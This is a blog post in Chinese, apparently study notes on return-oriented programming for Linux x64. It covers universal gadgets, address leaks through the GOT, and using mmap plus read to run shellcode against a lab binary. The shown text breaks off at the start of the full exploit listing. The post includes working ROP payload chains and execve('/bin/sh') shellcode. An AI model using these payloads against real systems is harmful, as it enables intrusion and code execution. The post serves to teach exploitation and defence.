<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="0x00序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x64的ROP攻击。 一步一步学ROP之linux_x86篇/tips/?id=6597 一步一步学ROP之linux_x64篇/papers/?id=7551 在这次的教程">
<meta name="keywords" content="ROP">
<meta property="og:type" content="article">
<meta property="og:title" content="一步一步学ROP笔记 - gadgets 和 2free">
<meta property="og:url" content="http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/index.html">
<meta property="og:site_name" content="Yuewei.Liang">
<meta property="og:description" content="0x00序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x64的ROP攻击。 一步一步学ROP之linux_x86篇/tips/?id=6597 一步一步学ROP之linux_x64篇/papers/?id=7551 在这次的教程">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-11-16T15:20:05.021Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="一步一步学ROP笔记 - gadgets 和 2free">
<meta name="twitter:description" content="0x00序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x64的ROP攻击。 一步一步学ROP之linux_x86篇/tips/?id=6597 一步一步学ROP之linux_x64篇/papers/?id=7551 在这次的教程">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>一步一步学ROP笔记 - gadgets 和 2free</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/11/21/业务安全测试关键点/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/11/16/一步一步学 ROP 笔记x64篇/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&text=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&is_video=false&description=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=一步一步学ROP笔记 - gadgets 和 2free&body=Check out this article: http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&name=一步一步学ROP笔记 - gadgets 和 2free&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00序"><span class="toc-number">1.</span> <span class="toc-text">0x00序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-通用-gadgets-part2"><span class="toc-number">2.</span> <span class="toc-text">0x01 通用 gadgets part2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-利用mmap执行任意shellcode"><span class="toc-number">3.</span> <span class="toc-text">0x02 利用mmap执行任意shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-堆漏洞利用之double-free"><span class="toc-number">4.</span> <span class="toc-text">0x03 堆漏洞利用之double free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-总结"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        一步一步学ROP笔记 - gadgets 和 2free
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Yuewei.Liang</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-11-16T15:08:54.000Z" itemprop="datePublished">2019-11-16</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/ROP/">ROP</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="0x00序"><a href="#0x00序" class="headerlink" title="0x00序"></a>0x00序</h3><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x64的ROP攻击。</p>
<p>一步一步学ROP之linux_x86篇/tips/?id=6597</p>
<p>一步一步学ROP之linux_x64篇/papers/?id=7551</p>
<p>在这次的教程中我们会带来通用gadgets和堆漏洞利用的技巧，欢迎大家继续学习。</p>
<p>另外文中涉及代码可在我的github下载:<a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP" target="_blank" rel="noopener">https://github.com/zhengmin1989/ROP_STEP_BY_STEP</a></p>
<h3 id="0x01-通用-gadgets-part2"><a href="#0x01-通用-gadgets-part2" class="headerlink" title="0x01 通用 gadgets part2"></a>0x01 通用 gadgets part2</h3><p>上次讲到了<strong>libc_csu_init()的一条万能gadgets，其实不光</strong>libc_csu_init()里的代码可以利用，默认gcc还会有如下自动编译进去的函数可以用来查找gadgets。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure>
<p>除此之外在程序执行的过程中，CPU只会关注于PC指针的地址，并不会关注是否执行了编程者想要达到的效果。因此，通过控制PC跳转到某些经过稍微偏移过的地址会得到意想不到的效果。</p>
<p>比如说说我们反编译一下__libc_csu_init()这个函数的尾部：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas __libc_csu_init</span><br><span class="line">Dump of assembler code for function __libc_csu_init:</span><br><span class="line">……</span><br><span class="line">   0x0000000000400606 &lt;+102&gt;:   movrbx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x000000000040060b &lt;+107&gt;:   movrbp,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x0000000000400610 &lt;+112&gt;:   mov    r12,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x0000000000400615 &lt;+117&gt;:   mov    r13,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x000000000040061a &lt;+122&gt;:   mov    r14,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x000000000040061f &lt;+127&gt;:   mov    r15,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x0000000000400624 &lt;+132&gt;:   add    rsp,0x38</span><br><span class="line">   0x0000000000400628 &lt;+136&gt;:   ret</span><br></pre></td></tr></table></figure>
<p>可以发现我们可以通过rsp控制r12-r15的值，但我们知道x64下常用的参数寄存器是rdi和rsi，控制r12-r15并没有什么太大的用处。不要慌，虽然原程序本身用是为了控制r14和r15寄存器的值。如下面的反编译所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/5i 0x000000000040061a</span><br><span class="line">   0x40061a &lt;__libc_csu_init+122&gt;:  mov    r14,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x40061f &lt;__libc_csu_init+127&gt;:  mov    r15,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x400624 &lt;__libc_csu_init+132&gt;:  add    rsp,0x38</span><br><span class="line">   0x400628 &lt;__libc_csu_init+136&gt;:  ret</span><br></pre></td></tr></table></figure>
<p>但是我们如果简单的对pc做个位移再反编译，我们就会发现esi和edi的值可以被我们控制了！如下面的反编译所示:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+123&gt;:  movesi,DWORD PTR [rsp+0x28]</span><br><span class="line">   0x40061f &lt;__libc_csu_init+127&gt;:  mov    r15,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x400624 &lt;__libc_csu_init+132&gt;:  add    rsp,0x38</span><br><span class="line">   0x400628 &lt;__libc_csu_init+136&gt;:  ret    </span><br><span class="line">   0x400629:    nop    DWORD PTR [rax+0x0]</span><br><span class="line">gdb-peda$ x/5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+128&gt;:  movedi,DWORD PTR [rsp+0x30]</span><br><span class="line">   0x400624 &lt;__libc_csu_init+132&gt;:  add    rsp,0x38</span><br><span class="line">   0x400628 &lt;__libc_csu_init+136&gt;:  ret    </span><br><span class="line">   0x400629:    nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure>
<p>虽然edi和esi只能控制低32位的数值，但已经可以满足我们的很多的rop需求了。</p>
<p>除了程序默认编译进去的函数，如果我们能得到libc.so或者其他库在内存中的地址，就可以获得到大量的可用的gadgets。比如上一篇文章中提到的通用gadget只能控制三个参数寄存器的值并且某些值只能控制32位，如果我们想要控制多个参数寄存器的值的话只能去寻找其他的gadgets了。这里就介绍一个_dl_runtime_resolve()中的gadget，通过这个gadget可以控制六个64位参数寄存器的值，当我们使用参数比较多的函数的时候（比如mmap和mprotect）就可以派上用场了。</p>
<p>我们把_dl_runtime_resolve反编译可以得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7def200 &lt;_dl_runtime_resolve&gt;:   sub    rsp,0x38</span><br><span class="line">0x7ffff7def204 &lt;_dl_runtime_resolve+4&gt;: mov    QWORD PTR [rsp],rax</span><br><span class="line">0x7ffff7def208 &lt;_dl_runtime_resolve+8&gt;: mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">0x7ffff7def20d &lt;_dl_runtime_resolve+13&gt;:    mov    QWORD PTR [rsp+0x10],rdx</span><br><span class="line">0x7ffff7def212 &lt;_dl_runtime_resolve+18&gt;:    mov    QWORD PTR [rsp+0x18],rsi</span><br><span class="line">0x7ffff7def217 &lt;_dl_runtime_resolve+23&gt;:    mov    QWORD PTR [rsp+0x20],rdi</span><br><span class="line">0x7ffff7def21c &lt;_dl_runtime_resolve+28&gt;:    mov    QWORD PTR [rsp+0x28],r8</span><br><span class="line">0x7ffff7def221 &lt;_dl_runtime_resolve+33&gt;:    mov    QWORD PTR [rsp+0x30],r9</span><br><span class="line">0x7ffff7def226 &lt;_dl_runtime_resolve+38&gt;:    movrsi,QWORD PTR [rsp+0x40]</span><br><span class="line">0x7ffff7def22b &lt;_dl_runtime_resolve+43&gt;:    movrdi,QWORD PTR [rsp+0x38]</span><br><span class="line">0x7ffff7def230 &lt;_dl_runtime_resolve+48&gt;:    call   0x7ffff7de8680 &lt;_dl_fixup&gt;</span><br><span class="line">0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax</span><br><span class="line">0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;:    mov    r9,QWORD PTR [rsp+0x30]</span><br><span class="line">0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;:    mov    r8,QWORD PTR [rsp+0x28]</span><br><span class="line">0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;:    movrdi,QWORD PTR [rsp+0x20]</span><br><span class="line">0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;:    movrsi,QWORD PTR [rsp+0x18]</span><br><span class="line">0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;:    movrdx,QWORD PTR [rsp+0x10]</span><br><span class="line">0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;:    movrcx,QWORD PTR [rsp+0x8]</span><br><span class="line">0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;:    movrax,QWORD PTR [rsp]</span><br><span class="line">0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;:    add    rsp,0x48</span><br><span class="line">0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11</span><br></pre></td></tr></table></figure>
<p>从0x7ffff7def235开始，就是这个通用gadget的地址了。通过这个gadget我们可以控制rdi，rsi，rdx，rcx， r8，r9的值。但要注意的是_dl_runtime_resolve()在内存中的地址是随机的。所以我们需要先用information leak得到_dl_runtime_resolve()在内存中的地址。那么_dl_runtime_resolve()的地址被保存在了哪个固定的地址呢？</p>
<p>通过反编译level5程序我们可以看到write@plt()这个函数使用PLT [0] 去查找write函数在内存中的地址，函数jump过去的地址*0x600ff8其实就是_dl_runtime_resolve()在内存中的地址了。所以只要获取到0x600ff8这个地址保存的数据，就能够找到_dl_runtime_resolve()在内存中的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0000000000400420 &lt;write@plt-0x10&gt;:</span><br><span class="line">  400420:   ff 35 ca 0b 20 00       pushq  0x200bca(%rip)        # 600ff0 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;</span><br><span class="line">  400426:   ff 25 cc 0b 20 00       jmpq   *0x200bcc(%rip)        # 600ff8 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;</span><br><span class="line">  40042c:   0f 1f 40 00             nopl   0x0(%rax)</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/x 0x600ff8</span><br><span class="line">0x600ff8 &lt;_GLOBAL_OFFSET_TABLE_+16&gt;:    0x00007ffff7def200</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/21i 0x00007ffff7def200</span><br><span class="line">   0x7ffff7def200 &lt;_dl_runtime_resolve&gt;:    sub    rsp,0x38</span><br><span class="line">   0x7ffff7def204 &lt;_dl_runtime_resolve+4&gt;:  mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x7ffff7def208 &lt;_dl_runtime_resolve+8&gt;:  mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x7ffff7def20d &lt;_dl_runtime_resolve+13&gt;: mov    QWORD PTR </span><br><span class="line">[rsp+0x10],rdx</span><br><span class="line">….</span><br></pre></td></tr></table></figure>
<p>另一个要注意的是，想要利用这个gadget，我们还需要控制rax的值，因为gadget是通过rax跳转的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax</span><br><span class="line">……</span><br><span class="line">0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11</span><br></pre></td></tr></table></figure>
<p>所以我们接下来用ROPgadget查找一下libc.so中控制rax的gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep &quot;rax&quot;</span><br><span class="line">0x000000000001f076 : pop rax ; pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000023950 : pop rax ; ret</span><br><span class="line">0x000000000019176e : pop rax ; ret 0xffed</span><br><span class="line">0x0000000000123504 : pop rax ; ret 0xfff0</span><br></pre></td></tr></table></figure>
<p>0x0000000000023950刚好符合我们的要求。有了pop rax和_dl_runtime_resolve这两个gadgets，我们就可以很轻松的调用想要的调用的函数了。</p>
<h3 id="0x02-利用mmap执行任意shellcode"><a href="#0x02-利用mmap执行任意shellcode" class="headerlink" title="0x02 利用mmap执行任意shellcode"></a>0x02 利用mmap执行任意shellcode</h3><p>看了这么多rop后是不是感觉我们利用rop只是用来执行system有点太不过瘾了？另外网上和msf里有那么多的shellcode难道在默认开启DEP的今天已经没有用处了吗？并不是的，我们可以通过mmap或者mprotect将某块内存改成RWX(可读可写可执行)，然后将shellcode保存到这块内存，然后控制pc跳转过去就可以执行任意的shellcode了，比如说建立一个socket连接等。下面我们就结合上一节中提到的通用gadgets来让程序执行一段shellcode。</p>
<p>我们测试的目标程序还是level5。在exp中，我们首先用上一篇中提到的_dl_runtime_resolve中的通用gadgets泄露出got_write和_dl_runtime_resolve的地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line"></span><br><span class="line">payload1 =  <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x4005F0</span>) <span class="comment"># movrdx, r15; movrsi, r14; movedi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload1 += p64(main)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=linker_point, rdx=4)</span></span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(linker_point) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x4005F0</span>) <span class="comment"># movrdx, r15; movrsi, r14; movedi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main)</span><br></pre></td></tr></table></figure>
<p>随后就可以根据偏移量和泄露的地址计算出其他gadgets的地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"></span><br><span class="line">shellcode = ( <span class="string">"\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e"</span> +</span><br><span class="line">              <span class="string">"\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89"</span> +</span><br><span class="line">              <span class="string">"\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span> )</span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="number">0xbeef0000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)</span></span><br><span class="line"></span><br><span class="line">payload3 =  <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">payload3 += p64(pop_rax_ret) + p64(mmap_addr)</span><br><span class="line">payload3 += p64(linker_addr+<span class="number">0x35</span>) + p64(<span class="number">0</span>) + p64(<span class="number">34</span>) + p64(<span class="number">7</span>) + p64(<span class="number">1024</span>) + p64(shellcode_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(rdi=0, rsi=shellcode_addr, rdx=1024)</span></span><br><span class="line"></span><br><span class="line">payload3 += p64(pop_rax_ret) + p64(plt_read)</span><br><span class="line">payload3 += p64(linker_addr+<span class="number">0x35</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1024</span>) + p64(shellcode_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload3 += p64(shellcode_addr)</span><br></pre></td></tr></table></figure>
<p>然后我们利用_dl_runtime_resolve里的通用gadgets调用mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0),开辟一段RWX的内存在0xbeef0000处。随后我们使用read(rdi=0, rsi=shellcode_addr, rdx=1024),把我们想要执行的shellcode读入到0xbeef0000这段内存中。最后再将指针跳转到shellcode处就可执行我们想要执行的任意代码了。</p>
<p>完整的exp8.py代码如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span 